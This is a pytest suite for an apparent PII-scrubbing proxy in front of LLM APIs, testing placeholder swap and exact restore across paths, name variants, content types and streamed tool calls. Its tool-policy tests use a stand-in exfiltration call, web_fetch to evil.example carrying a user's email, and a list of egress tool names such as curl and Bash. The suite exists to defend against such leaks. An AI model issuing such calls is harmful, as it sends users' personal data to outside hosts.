    with pytest.raises(s.ScrubError):
        scp.scrub_request({"messages": [{"role": "user", "content": "budget $2.47B"}]})


def test_private_terms_file(tmp_path):
    pf = tmp_path / "private_terms.yaml"
    pf.write_text("terms:\n  - Acme Ledger\n  - {regex: '(11'}\n  - {regex: 'blue ?bird v\\d'}\nfigures:\n"
                  "  - 2470000000\n  - {amount: oops}\n", encoding="utf-8")
    rules, st = s.build_private_terms(str(pf))
    assert st == {"by_type": {"PRIVATE_TERM": 2, "PRIVATE_FIGURE": 1}, "bad": 2}
    assert rules[-1][2] == ["2.47", "2470", "2470000000"]         # figure gates, commas dropped
    cfg = dict(s.DEFAULTS, private_terms_file=str(pf), state_dir=str(tmp_path / "st"))
    sc2 = s.Scrubber(cfg)
    t = "the Acme  Ledger at $2,470M, bluebird v2"
    o = sc2.scrub_text(t)
    assert "Acme" not in o and "2,470" not in o and "bluebird" not in o and sc2.restore_text(o) == t


# ---- filesystem paths: a known name that is a folder name stays put, and the egress check agrees
@pytest.mark.parametrize("text", [
    "read /home/jane/notes/todo.md", "ls ~/jane/x", "open /srv/Jane/a.txt now", '{"path": "/home/jane/proj"}',
    "cd /home/jane", "see jane/docs/readme.md", "./jane/run.sh", "../jane/x", "/home/ozzie/x and /home/jane/y"])
def test_known_name_inside_path_left_alone(sc, text):
    assert sc.scrub_text(text) == text
    assert sc.leftover_known(text) == 0
    assert sc.path_kept(text) >= 1


@pytest.mark.parametrize("text,gone", [
    ("ask Jane/Ozzie", "Jane"), ("corp.example/jane", "jane"), ("https://x.example/jane/a", "jane"),
    ("Jane wrote /home/jane/x", "Jane wrote"), ("files of Jane Q Doe/", "Jane Q Doe")])
def test_names_outside_paths_still_swapped(sc, text, gone):
    f = s.Forms()
    o = sc.scrub_text(text, forms=f)
    assert gone not in o
    assert sc.restore_text(o, forms=f) == text


def test_path_request_passes_egress_and_round_trips(sc):
    body = {"model": "m", "messages": [
        {"role": "user", "content": "Jane, read /home/jane/notes.md"},
        {"role": "assistant", "content": "", "tool_calls": [{"id": "c1", "type": "function", "function": {
            "name": "read_file", "arguments": json.dumps({"path": "/home/jane/notes.md"})}}]}]}
    out = sc.scrub_request(json.loads(json.dumps(body)))
    assert out["messages"][0]["content"].startswith("\u00abPERSON_")
    assert "/home/jane/notes.md" in out["messages"][0]["content"]
    assert json.loads(out["messages"][1]["tool_calls"][0]["function"]["arguments"])["path"] == "/home/jane/notes.md"


def test_lowercase_variant_restores_lowercase(sc):
    sc.scrub_text("Jane said hi")
    f = s.Forms()
    o = sc.scrub_text("jane said hi", forms=f)
    assert "jane" not in o
    assert sc.restore_text(o, forms=f) == "jane said hi"
    f.next.clear()
    r = sc.stream_restorer(forms=f)
    assert "".join(r.feed(ch) for ch in o) + r.flush() == "jane said hi"


# ---- fix2 (Nov 8 2026, after the Veil side-by-side): JSON under any content type; exact restore of every surface form ----
FAKE_PHONES = ["(425) 555-0100", "425.555.0100", "+1 425-555-0100"]         # fictional 555-01xx numbers


def test_phone_restore_keeps_each_written_form(sc):
    txt = "call " + " or ".join(FAKE_PHONES) + " today"
    o = sc.scrub_text(txt)
    assert "555" not in o and o.count("\u00abPHONE_") == 3
    assert sc.restore_text(o) == txt
    for p in FAKE_PHONES:
        o1 = sc.scrub_text("ring " + p)
        assert "555" not in o1 and sc.restore_text(o1) == "ring " + p
        r = sc.stream_restorer()
        assert "".join(r.feed(ch) for ch in o1) + r.flush() == "ring " + p
    sc.save_vault()                                    # a restart keeps the surface forms
    sc2 = s.Scrubber(sc.cfg, known=KNOWN, vault_path=sc.vault_path)
    assert sc2.restore_text(o) == txt


def test_restore_exact_for_variant_forms_of_every_type(sc):
    first = sc.scrub_text(TEXT)
    variant = TEXT.replace("425-555-0182", "(425) 555-0182").replace("jdoe@corp.example", "JDoe@Corp.Example") \
        .replace("+44 20 7946 0958", "+44 (0)20 7946 0958").replace("Jane Q Doe", "jane q doe")
    f = s.Forms()
    second = sc.scrub_text(variant, forms=f)
    assert "7946" not in second and "JDoe" not in second
    assert sc.restore_text(first) == TEXT and sc.restore_text(second, forms=f) == variant
    for k in ("arguments",):                            # tool-call arguments come back exact too (JSON-escaped path)
        args = json.dumps({"to": FAKE_PHONES[0], "who": "Jane Q Doe"})
        body = {"messages": [{"role": "assistant", "content": "", "tool_calls": [{"id": "c1", "type": "function",
                "function": {"name": "lookup", k: args}}]}]}
        f = s.Forms()
        sc.scrub_request(body, forms=f)
        sent = body["messages"][0]["tool_calls"][0]["function"][k]
        assert "555" not in sent and "Jane" not in sent
        assert sc.restore_obj(body, forms=f)["messages"][0]["tool_calls"][0]["function"][k] == args


def test_token_id_inputs_fail_closed(sc):
    for b in ({"model": "m", "input": [101, 2023]}, {"model": "m", "input": [[101, 2023]]}, {"model": "m", "prompt": [5, 6]}):
        with pytest.raises(s.ScrubError, match="token-id"):
            sc.scrub_request(b)


def _raw(px, path, data, headers):
    import http.client
    c = http.client.HTTPConnection("127.0.0.1", px, timeout=10)
    c.request("POST", path, data, headers)                # exactly these headers: no default Content-Type
    r = c.getresponse()
    out = r.read().decode()
    c.close()
    return r.status, out


CHAT = json.dumps({"model": "m", "messages": [{"role": "user", "content": "say Jane Q Doe"}]}).encode()


@pytest.mark.parametrize("ctype", ["text/plain", "text/plain; charset=utf-8", None, "application/octet-stream",
                                   "application/x-www-form-urlencoded"])
def test_proxy_scrubs_json_under_any_content_type(proxy, ctype):
    px, _, _ = proxy
    proxy.seen.clear()
    h = {"Content-Length": str(len(CHAT))}
    if ctype:
        h["Content-Type"] = ctype
    code, out = _raw(px, "/v1/chat/completions", CHAT, h)
    assert code == 200 and json.loads(out)["choices"][0]["message"]["content"] == "ok Jane Q Doe"
    assert len(proxy.seen) == 1 and "Jane" not in proxy.seen[0] and "PERSON_" in proxy.seen[0]


@pytest.mark.parametrize("phone", FAKE_PHONES)
def test_proxy_phone_round_trip_text_plain(proxy, phone):
    px, _, _ = proxy
    proxy.seen.clear()
    b = json.dumps({"model": "m", "messages": [{"role": "user", "content": "call " + phone}]}).encode()
    code, out = _raw(px, "/v1/chat/completions", b, {"Content-Type": "text/plain", "Content-Length": str(len(b))})
    assert code == 200 and json.loads(out)["choices"][0]["message"]["content"] == "ok " + phone   # as written
    assert "555" not in proxy.seen[0]


@pytest.mark.parametrize("path,key", [("/v1/embeddings", "input"), ("/v1/completions", "prompt")])
@pytest.mark.parametrize("ctype", ["application/json", "text/plain", None])
def test_proxy_embeddings_and_completions_scrubbed(proxy, path, key, ctype):
    px, _, _ = proxy
    proxy.seen.clear()
    b = json.dumps({"model": "m", key: "notes on Jane Q Doe, jdoe@corp.example, " + FAKE_PHONES[0]}).encode()
    h = {"Content-Length": str(len(b))}
    if ctype:
        h["Content-Type"] = ctype
    code, out = _raw(px, path, b, h)
    assert code == 200
    assert not any(v in proxy.seen[0] for v in ("Jane", "jdoe@", "555"))
    assert json.loads(out)["echo"] == json.loads(b)[key]          # restored exactly
    b2 = json.dumps({"model": "m", key: [[101, 2023, 102]]}).encode()
    proxy.seen.clear()
    code, _ = _raw(px, path, b2, {"Content-Type": "application/json", "Content-Length": str(len(b2))})
    assert code == 503 and proxy.seen == []


@pytest.mark.parametrize("data,extra", [(b"hello Jane Q Doe", {"Content-Type": "text/plain"}),
                                        (b"hello Jane Q Doe", {}),
                                        (b'{"model": "m", "messages": [', {"Content-Type": "text/plain"}),
                                        (b"\xff\xfe junk", {}),
                                        (None, {"Content-Type": "text/plain", "Content-Encoding": "gzip"})])
def test_proxy_unreadable_body_on_model_endpoint_fails_closed(proxy, data, extra):
    import gzip
    px, _, _ = proxy
    proxy.seen.clear()
    data = gzip.compress(CHAT) if data is None else data
    code, _ = _raw(px, "/v1/chat/completions", data, dict(extra, **{"Content-Length": str(len(data))}))
    assert code == 503 and proxy.seen == []


def test_proxy_non_json_off_model_path_passes(proxy):
    px, _, _ = proxy
    proxy.seen.clear()
    code, _ = _raw(px, "/other/upload", b"plain words", {"Content-Type": "text/plain", "Content-Length": "11"})
    assert code == 200 and proxy.seen == ["plain words"]
    b = json.dumps({"note": "Jane Q Doe"}).encode()              # JSON off the model path is still scrubbed
    code, _ = _raw(px, "/other/upload", b, {"Content-Type": "text/plain", "Content-Length": str(len(b))})
    assert code == 200 and "Jane" not in proxy.seen[-1]



# ---- 0.1.1 (Nov 8 2026, after the OpenClaw test): written variants of a known value; Anthropic stream restore ----
KNOWN2 = [("Jane Testperson", "PERSON"), ("jane@example.test", "EMAIL")]
VARIANTS = ["Jane\u00a0Testperson", "Jane  Testperson", "Jane\tTestperson", "Jane \u00a0 Testperson", "Jane.Testperson",
            "Jane_Testperson", "Jane-Testperson", "Jane%20Testperson", "JANE TESTPERSON", "jane testperson",
            "Jane\u200bTestperson", "Jane\u3000Testperson", "jane.TESTPERSON", "Jane Testperson"]


@pytest.fixture
def sc2(tmp_path):
    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st2"), system_note=""), known=KNOWN2)


@pytest.mark.parametrize("v", VARIANTS)
def test_known_variant_caught_same_placeholder_exact_restore(sc2, v):
    ph = sc2.scrub_text("Jane Testperson")
    f = s.Forms()
    txt = "note for %s today" % v
    o = sc2.scrub_text(txt, forms=f)
    assert o == "note for %s today" % ph                       # one person, one placeholder
    assert sc2.restore_text(o, forms=f) == txt                  # the form that was written comes back, byte for byte
    assert sc2.leftover_known(txt) == 1                         # the egress re-check sees it too
    body = {"model": "m", "messages": [{"role": "user", "content": txt}]}
    sc2.scrub_request(body)
    assert body["messages"][0]["content"] == o


def test_all_variants_in_one_text_round_trip(sc2):
    txt = " / ".join(VARIANTS) + " <jane@example.test> JANE@EXAMPLE.TEST"
    f = s.Forms()
    o = sc2.scrub_text(txt, forms=f)
    assert "esterson" not in o.lower() and "@" not in o
    assert set(s.PH_RE.findall(o)) == {("PERSON", "1"), ("EMAIL", "1")}
    assert sc2.restore_text(o, forms=f) == txt
    f.next.clear()                                              # the same, streamed one character at a time
    r = sc2.stream_restorer(forms=f)
    assert "".join(r.feed(ch) for ch in o) + r.flush() == txt


@pytest.mark.parametrize("v", VARIANTS)
def test_variant_that_slips_is_blocked(sc2, monkeypatch, v):
    monkeypatch.setattr(sc2, "scrub_text", lambda t, c=None, f=None: t)       # a broken swap
    with pytest.raises(s.ScrubError, match="egress"):
        sc2.scrub_request({"messages": [{"role": "user", "content": "hi " + v}]})


def test_variant_in_unscrubbed_field_is_blocked(sc2):
    with pytest.raises(s.ScrubError, match="egress"):
        sc2.scrub_request({"model": "m", "service_tier": "Jane%20Testperson", "messages": [{"role": "user", "content": "hi"}]})


@pytest.mark.parametrize("text", [
    "Jane went to the Testperson museum", "Janet Testpersonal",
    "the quick brown fox jumps over the lazy dog", "a well-known re.match_case e-mail of 20%", "jane", "testperson",
    "Jane.Testpersons"])
def test_variants_no_false_positives(sc2, text):
    assert sc2.scrub_text(text) == text
    assert sc2.leftover_known(text) == 0


@pytest.mark.parametrize("text", ["Jane,Testperson", "x_Jane_Testperson_y", "mail.Jane.Testperson"])
def test_variants_the_matcher_leaves_are_blocked_by_the_skeleton_recheck(sc2, text):
    # 0.4.4: the matcher keeps its whole-word edges, the egress re-check is looser on purpose: the name is still there
    assert sc2.scrub_text(text) == text
    assert sc2.leftover_known(text) > 0


@pytest.mark.parametrize("text", ["/home/x/Jane.Testperson/notes.md", "~/jane_testperson/a.txt",
                                  '{"path": "/srv/JANE.TESTPERSON/x"}', "ls ./Jane-Testperson/"])
def test_variant_inside_path_left_alone(sc2, text):
    assert sc2.scrub_text(text) == text
    assert sc2.leftover_known(text) == 0


def test_private_term_variants(tmp_path):
    p = tmp_path / "pt.yaml"
    p.write_text("terms:\n  - Project Bluebird\n")
    rules, _ = s.build_private_terms(str(p))
    sc3 = s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "st3")), known=[], private=rules)
    f = s.Forms()
    txt = "Project Bluebird, project.bluebird, PROJECT\u00a0BLUEBIRD and Project%20Bluebird"
    o = sc3.scrub_text(txt, forms=f)
    assert set(s.PH_RE.findall(o)) == {("PRIVATE_TERM", "1")} and sc3.restore_text(o, forms=f) == txt


def test_proxy_variant_round_trip(proxy):
    px, _, _ = proxy
    for v in ("JANE.Q.DOE", "Jane\u00a0Q\u00a0Doe", "jane%20q%20doe"):
        proxy.seen.clear()
        b = json.dumps({"model": "m", "messages": [{"role": "user", "content": "say " + v}]}, ensure_ascii=False).encode()
        code, out = _raw(px, "/v1/chat/completions", b, {"Content-Type": "application/json", "Content-Length": str(len(b))})
        assert code == 200 and json.loads(out)["choices"][0]["message"]["content"] == "ok " + v
        assert "PERSON_1" in proxy.seen[0] and "doe" not in proxy.seen[0].lower()


# Anthropic /v1/messages streams
def _anth_run(scr, events, forms=None):
    st, out = {"_forms": forms}, []
    for ev in events:
        ev = json.loads(json.dumps(ev))
        if s.is_anthropic_event(ev):
            out += s.restore_anthropic_event(scr, ev, st)
        out.append(ev)
    out += s.flush_anthropic(st)
    return out


def _anth_collect(events):
    text, js, order = "", "", []
    for ev in events:
        d = ev.get("delta") or {}
        if ev["type"] == "content_block_delta":
            order.append(ev["index"])
            text += d.get("text", "")
            js += d.get("partial_json", "")
        if ev["type"] == "content_block_stop":
            order.append(("stop", ev["index"]))
    return text, js, order


def test_anthropic_stream_restore_split_deltas_and_tool_json(sc):
    p, e = sc.scrub_text("Jane Q Doe"), sc.scrub_text("jdoe@corp.example")
    ev = _anth_run(sc, anthropic_fixture(p, e))
    text, js, order = _anth_collect(ev)
    assert text == "Hi Jane Q Doe, writing to you now Jane Q Doe"
    assert json.loads(js) == {"to": "jdoe@corp.example", "subject": "hi", "name": "Jane Q Doe"}
    assert order.index(("stop", 0)) > max(i for i, x in enumerate(order) if x == 0)    # nothing after its stop
    assert "\u00ab" not in json.dumps(ev, ensure_ascii=False)


def test_anthropic_every_split_position(sc):
    p = sc.scrub_text("Jane Q Doe")
    full = "say " + p + " and " + p + "!"
    for i in range(1, len(full)):
        for j in range(i + 1, len(full) + 1):
            evs = [{"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}}]
            evs += [{"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": x}}
                    for x in (full[:i], full[i:j], full[j:])]
            evs.append({"type": "content_block_stop", "index": 0})
            assert _anth_collect(_anth_run(sc, evs))[0] == "say Jane Q Doe and Jane Q Doe!"


def test_anthropic_dangling_partial_flushed_before_stop(sc):
    evs = [{"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": "price \u00abPER"}},
           {"type": "content_block_stop", "index": 0}]
    out = _anth_run(sc, evs)
    assert [x["type"] for x in out] == ["content_block_delta", "content_block_delta", "content_block_stop"]
    assert _anth_collect(out)[0] == "price \u00abPER"


def test_anthropic_thinking_and_other_events_untouched(sc):
    p = sc.scrub_text("Jane Q Doe")
    evs = [{"type": "content_block_delta", "index": 0, "delta": {"type": "thinking_delta", "thinking": "about " + p}},
           {"type": "content_block_delta", "index": 0, "delta": {"type": "signature_delta", "signature": "abc"}},
           {"type": "message_delta", "delta": {"stop_reason": "end_turn"}}]
    assert _anth_run(sc, evs) == evs


def _sse_events(raw):
    out = []
    for block in raw.split("\n\n"):
        lines = [x for x in block.split("\n") if x]
        if not lines:
            continue
        name = [x[6:].strip() for x in lines if x.startswith("event:")]
        data = [x[5:].strip() for x in lines if x.startswith("data:")]
        ev = json.loads(data[0])
        assert name == [ev["type"]], block                        # every event keeps its own `event:` line
        out.append(ev)
    return out


def test_proxy_anthropic_stream_restored(proxy):
    px, _, _ = proxy
    proxy.seen.clear()
    b = json.dumps({"model": "m", "stream": True, "max_tokens": 50, "messages": [
        {"role": "user", "content": "write to Jane Q Doe at jdoe@corp.example"}]}).encode()
    code, out = _raw(px, "/v1/messages", b, {"Content-Type": "application/json", "Content-Length": str(len(b)),
                                              "anthropic-version": "2023-06-01"})
    assert code == 200
    assert "Jane" not in proxy.seen[0] and "jdoe" not in proxy.seen[0]
    evs = _sse_events(out)
    text, js, _ = _anth_collect(evs)
    assert text == "Hi Jane Q Doe, writing to you now Jane Q Doe"
    assert json.loads(js) == {"to": "jdoe@corp.example", "subject": "hi", "name": "Jane Q Doe"}
    assert "\u00ab" not in out and evs[-1]["type"] == "message_stop"


def test_proxy_anthropic_json_restored(proxy):
    px, _, _ = proxy
    b = json.dumps({"model": "m", "max_tokens": 50, "messages": [
        {"role": "user", "content": "write to JANE Q DOE at jdoe@corp.example"}]}).encode()
    code, out = _raw(px, "/v1/messages", b, {"Content-Type": "application/json", "Content-Length": str(len(b))})
    j = json.loads(out)
    assert code == 200 and j["content"][0]["text"] == "Hi JANE Q DOE"
    assert j["content"][1]["input"] == {"to": "jdoe@corp.example", "name": "JANE Q DOE"}


@pytest.mark.parametrize("text,value", [
    ("mail ren [at] example [dot] org today", "ren [at] example [dot] org"),
    ("mail mila(at)sample(dot)example.", "mila(at)sample(dot)example"),
    ("mail ann (at) mail.example.org", "ann (at) mail.example.org"),
    ("mail kay\uff20sample.example now", "kay\uff20sample.example"),
    ("mail ori\u200b@example.org now", "ori\u200b@example.org"),
    ("host 2001:db8:7::25 up", "2001:db8:7::25"),
    ("url https://[2001:db8::7:25]:443/v2", "2001:db8::7:25"),
    ("full 2001:0db8:0007:0000:0000:0000:0000:0025.", "2001:0db8:0007:0000:0000:0000:0000:0025")])
def test_generic_gap_patterns(sc, text, value):
    f = s.Forms()
    o = sc.scrub_text(text, forms=f)
    assert value not in o and sc.restore_text(o, forms=f) == text


@pytest.mark.parametrize("text", ["meet (at) noon", "see [at] the end. done", "at 12:30:45 today", "mac 00:1a:2b:3c:4d:5e",
                                  "local ::1 and ::", "std::vector<int> a::b", "ratio 3:2:1", "dead:beef", "fe80::"])
def test_generic_gap_patterns_no_false_positives(sc, text):
    assert sc.scrub_text(text) == text


def test_tool_json_escaped_placeholder_split_every_position(sc):
    p, e = sc.scrub_text("Jane Q Doe"), sc.scrub_text("jdoe@corp.example")
    args = json.dumps({"to": e, "name": p, "note": "a\\b \"q\""})          # ensure_ascii: «» arrive as \u00ab..\u00bb
    assert "\\u00ab" in args
    want = json.dumps({"to": "jdoe@corp.example", "name": "Jane Q Doe", "note": "a\\b \"q\""})
    for i in range(1, len(args)):
        for j in range(i + 1, len(args) + 1, 3):
            evs = [{"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": x}}
                   for x in (args[:i], args[i:j], args[j:])] + [{"type": "content_block_stop", "index": 1}]
            assert json.loads(_anth_collect(_anth_run(sc, evs))[1]) == json.loads(want)


# ---- Nov 9 2026: the 3.13 CI flake was the test harness, not the proxy. Pin both down. ----
def test_mock_upstreams_are_isolated():
    a, sa = _mock_upstream()
    b, sb = _mock_upstream()
    try:
        assert a.server_address[1] != b.server_address[1]
        d = json.dumps({"model": "m", "prompt": "only for a"}).encode()
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:%d/v1/completions" % a.server_address[1],
                                                      data=d, method="POST"), timeout=10).read()
        assert sa == [d.decode()] and sb == []
    finally:
        for srv in (a, b):
            srv.shutdown()
            srv.server_close()


def test_proxy_fixture_is_really_the_proxy(proxy):
    px, _, _ = proxy
    assert px != proxy.up
    h = json.loads(urllib.request.urlopen("http://127.0.0.1:%d/scrubber/health" % px, timeout=5).read())
    assert "ok" in h and proxy.seen == []


PROMPTS = ["notes on Jane Q Doe, jdoe@corp.example, " + FAKE_PHONES[0],
           ["notes on Jane Q Doe", "mail jdoe@corp.example", "call " + FAKE_PHONES[0]],
           [["Jane Q Doe wrote"], ["to jdoe@corp.example"]]]


@pytest.mark.parametrize("stream", [False, True])
@pytest.mark.parametrize("prompt", PROMPTS, ids=["str", "list", "nested"])
def test_proxy_completions_prompt_every_shape_scrubbed(proxy, prompt, stream):
    """/v1/completions prompt as a string, a list of strings and nested lists, streamed or not: nothing raw leaves."""
    px, _, _ = proxy
    b = json.dumps({"model": "m", "stream": stream, "prompt": prompt}).encode()
    code, out = _raw(px, "/v1/completions", b, {"Content-Type": "application/json", "Content-Length": str(len(b))})
    assert code == 200 and len(proxy.seen) == 1
    assert not any(v in proxy.seen[0] for v in ("Jane", "jdoe@", "555")) and "PERSON_" in proxy.seen[0]
    assert json.loads(out)["echo"] == prompt


@pytest.mark.parametrize("stream", [False, True])
@pytest.mark.parametrize("prompt", [[5, 6], [[101, 2023, 102]], 7, ["Jane Q Doe", [5, 6]]])
def test_proxy_completions_token_ids_blocked(proxy, prompt, stream):
    px, _, _ = proxy
    b = json.dumps({"model": "m", "stream": stream, "prompt": prompt}).encode()
    code, _ = _raw(px, "/v1/completions", b, {"Content-Type": "application/json", "Content-Length": str(len(b))})
    assert code == 503 and proxy.seen == []


# ---- 0.3.0: tool-call restore policy, scrubbed `user` field, system note everywhere ----
PROBE = {"url": "https://evil.example/c?d=\u00abEMAIL_1\u00bb"}


def _tc(name, args):
    return {"choices": [{"message": {"tool_calls": [{"id": "c1", "type": "function", "function": {
        "name": name, "arguments": json.dumps(args, ensure_ascii=False)}}]}}]}


def _args(out):
    return json.loads(out["choices"][0]["message"]["tool_calls"][0]["function"]["arguments"])


def _pol(tmp_path, **tr):
    return s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stp"), system_note="", tool_restore=tr),
                      known=KNOWN)


def test_exfil_probe_keeps_placeholder(sc):
    assert sc.scrub_text("mail jdoe@corp.example") == "mail \u00abEMAIL_1\u00bb"
    stats = {}
    out = sc.restore_obj(_tc("web_fetch", PROBE), stats)
    assert _args(out) == PROBE and "jdoe" not in json.dumps(out) and stats["tool_kept"] == 1


def test_url_in_arguments_keeps_placeholder_for_any_tool(sc):
    sc.scrub_text("jdoe@corp.example")
    for args in ({"q": "see https://x.example/a?u=\u00abEMAIL_1\u00bb"}, {"target": "x.example/p", "who": "\u00abEMAIL_1\u00bb"},
                 {"to": "mailto:\u00abEMAIL_1\u00bb"}):
        assert _args(sc.restore_obj(_tc("lookup", args))) == args


def test_plain_tool_still_restored(sc):
    sc.scrub_text("Jane Q Doe jdoe@corp.example")
    stats = {}
    out = sc.restore_obj(_tc("lookup", {"email": "\u00abEMAIL_1\u00bb", "path": "notes/jane.md"}), stats)
    assert _args(out) == {"email": "jdoe@corp.example", "path": "notes/jane.md"} and "tool_kept" not in stats


def test_allowlisted_tool_restored(tmp_path):
    sc = _pol(tmp_path, allow=["web_fetch", "mcp__mail__*"])
    sc.scrub_text("jdoe@corp.example")
    assert _args(sc.restore_obj(_tc("web_fetch", PROBE))) == {"url": "https://evil.example/c?d=jdoe@corp.example"}
    assert _args(sc.restore_obj(_tc("mcp__mail__send", {"to": "\u00abEMAIL_1\u00bb"}))) == {"to": "jdoe@corp.example"}


def test_deny_and_default_keep(tmp_path):
    sc = _pol(tmp_path, deny=["lookup"])
    sc.scrub_text("jdoe@corp.example")
    a = {"email": "\u00abEMAIL_1\u00bb"}
    assert _args(sc.restore_obj(_tc("lookup", a))) == a
    sc = _pol(tmp_path, default="keep", allow=["save_note"])
    sc.scrub_text("jdoe@corp.example")
    assert _args(sc.restore_obj(_tc("read_file", a))) == a
    assert _args(sc.restore_obj(_tc("save_note", a))) == {"email": "jdoe@corp.example"}
    sc = _pol(tmp_path, allow=["lookup"], deny=["lookup"])               # deny wins
    assert _args(sc.restore_obj(_tc("lookup", a))) == a


def test_tool_restore_false_restores_everything(tmp_path):
    sc = s.Scrubber(dict(s.DEFAULTS, mode="on", state_dir=str(tmp_path / "stf"), tool_restore=False), known=KNOWN)
    sc.scrub_text("jdoe@corp.example")
    assert _args(sc.restore_obj(_tc("web_fetch", PROBE))) == {"url": "https://evil.example/c?d=jdoe@corp.example"}


@pytest.mark.parametrize("name", ["web_fetch", "WebFetch", "WebSearch", "Bash", "exec", "exec_command", "local_shell",
                                  "run_shell_command", "http_request", "curl", "send_email", "gmail_send", "git_push",
                                  "browser_navigate", "mcp__fetch__fetch", "upload_file", "post", "message", "PowerShell",
                                  "download_url", "slack_webhook"])
def test_egress_names_keep(sc, name):
    assert sc.tool_policy().by_name(name) == "keep"


@pytest.mark.parametrize("name", ["read_file", "lookup", "create_note", "search_contacts", "prune_cache", "truncate",
                                  "Edit", "apply_patch", "get_weather", "calendar_list", "sender_stats", "postal_code"])
def test_other_names_depend_on_arguments(sc, name):
    assert sc.tool_policy().by_name(name) is None


def test_bad_tool_restore_config_fails_at_load(tmp_path):
    p = tmp_path / "swapback.yaml"
    p.write_text("tool_restore:\n  default: maybe\n")
    with pytest.raises(ValueError, match="tool_restore"):
        s.load_cfg(str(p))
    p.write_text("tool_restore:\n  default: keep\n  allow: [lookup]\n")
    assert s.ToolPolicy(s.load_cfg(str(p))["tool_restore"]).by_name("lookup") == "restore"


def _chat_stream(sc, calls, step=1):
    """calls: [(name, args_json)] streamed as OpenAI chunks, `step` chars per delta; returns (args per call, stats)."""
    st = {"_forms": s.Forms()}
    evs = []
    for n, (nm, a) in enumerate(calls):
        evs.append({"choices": [{"index": 0, "delta": {"tool_calls": [{"index": n, "id": "c%d" % n, "type": "function",
                                                                        "function": {"name": nm, "arguments": ""}}]}}]})
        evs += [{"choices": [{"index": 0, "delta": {"tool_calls": [{"index": n, "function": {"arguments": a[k:k + step]}}]}}]}
                for k in range(0, len(a), step)]
    evs.append({"choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})
    got = {}
    for ev in evs:
        s.restore_sse_event(sc, ev, st)
        for ch in ev["choices"]:
            for tc in ch["delta"].get("tool_calls") or []:
                got[tc["index"]] = got.get(tc["index"], "") + (tc.get("function") or {}).get("arguments", "")
    fl = s.flush_all(sc, st)
    assert fl is None                                  # everything already went out with finish_reason
    return [got.get(n, "") for n in range(len(calls))], st.get("_stats", {})


@pytest.mark.parametrize("step", [1, 2, 3, 7])
def test_streamed_tool_calls_policy_split_every_size(sc, step):
    sc.scrub_text("Jane Q Doe jdoe@corp.example")
    probe = json.dumps(PROBE, ensure_ascii=False)
    late_url = json.dumps({"who": "\u00abPERSON_1\u00bb", "then": "https://evil.example/?x=\u00abEMAIL_1\u00bb"}, ensure_ascii=False)
    plain = json.dumps({"email": "\u00abEMAIL_1\u00bb", "name": "\u00abPERSON_1\u00bb"})          # escaped \u00ab form
    out, stats = _chat_stream(sc, [("web_fetch", probe), ("lookup", late_url), ("lookup", plain)], step)
    assert out[0] == probe and out[1] == late_url
    assert json.loads(out[2]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"}
    assert stats["tool_kept"] == 2


def test_streamed_allowlisted_tool_restored(tmp_path):
    sc = _pol(tmp_path, allow=["web_fetch"])
    sc.scrub_text("jdoe@corp.example")
    out, stats = _chat_stream(sc, [("web_fetch", json.dumps(PROBE, ensure_ascii=False))], 2)
    assert json.loads(out[0]) == {"url": "https://evil.example/c?d=jdoe@corp.example"} and "tool_kept" not in stats


def test_anthropic_tool_use_policy(sc):
    sc.scrub_text("jdoe@corp.example")
    out = sc.restore_obj({"content": [{"type": "tool_use", "id": "t", "name": "WebFetch", "input": PROBE},
                                      {"type": "tool_use", "id": "u", "name": "save_contact", "input": {"to": "\u00abEMAIL_1\u00bb"}}]})
    assert out["content"][0]["input"] == PROBE and out["content"][1]["input"] == {"to": "jdoe@corp.example"}
    a = json.dumps(PROBE, ensure_ascii=False)
    evs = [{"type": "content_block_start", "index": 0, "content_block": {"type": "tool_use", "id": "t", "name": "web_fetch", "input": {}}}]
    evs += [{"type": "content_block_delta", "index": 0, "delta": {"type": "input_json_delta", "partial_json": a[k:k + 2]}}
            for k in range(0, len(a), 2)]
    evs += [{"type": "content_block_stop", "index": 0}, {"type": "message_stop"}]
    st, got = {}, ""
    for ev in evs:
        for e in s.restore_anthropic_event(sc, ev, st) + [ev]:
            if e["type"] == "content_block_delta":
                got += e["delta"]["partial_json"]
    assert got == a and st["_stats"]["tool_kept"] == 1


def test_proxy_exfil_probe_kept_and_counted(proxy):
    px, _, st = proxy
    for stream in (False, True):
        proxy.seen.clear()
        code, out = _post(px, {"model": "m", "stream": stream, "metadata": {"scenario": "tools"},
                               "messages": [{"role": "user", "content": "write to jdoe@corp.example"}]})
        assert code == 200 and "jdoe" not in proxy.seen[0]
        if stream:
            args = {}
            for l in out.splitlines():
                if l.startswith("data: {"):
                    for tc in json.loads(l[6:])["choices"][0]["delta"].get("tool_calls") or []:
                        args[tc["index"]] = args.get(tc["index"], "") + tc["function"].get("arguments", "")
            fetch, look = json.loads(args[0]), json.loads(args[1])
        else:
            tcs = json.loads(out)["choices"][0]["message"]["tool_calls"]
            fetch, look = json.loads(tcs[0]["function"]["arguments"]), json.loads(tcs[1]["function"]["arguments"])
        assert "jdoe" not in fetch["url"] and fetch["url"].startswith("https://evil.example/c?d=\u00abEMAIL_")
        assert look == {"email": "jdoe@corp.example"}
    log = [json.loads(x) for x in (st / "st" / "requests.jsonl").read_text().splitlines()]
    assert [r["tool_kept"] for r in log[-2:]] == [1, 1]
    assert "jdoe" not in (st / "st" / "requests.jsonl").read_text()


def test_user_metadata_instructions_scrubbed(sc):
    b = {"model": "m", "user": "jdoe@corp.example", "metadata": {"user_id": "Jane Q Doe"},
         "instructions": "Answer Ozzie Pellam briefly.", "input": "hi", "safety_identifier": "jdoe@corp.example"}
    sc.scrub_request(b)
    assert "jdoe" not in json.dumps(b) and "Jane" not in json.dumps(b) and "Ozzie" not in json.dumps(b)
    assert b["user"] == b["safety_identifier"] == "\u00abEMAIL_1\u00bb"


NOTE = s.DEFAULTS["system_note"]


def test_system_note_inserted_without_system_message(scn):
    b = {"messages": [{"role": "user", "content": "hi Jane Q Doe"}]}
    scn.scrub_request(b)
    assert b["messages"][0] == {"role": "system", "content": NOTE} and len(b["messages"]) == 2
    scn.scrub_request(b)
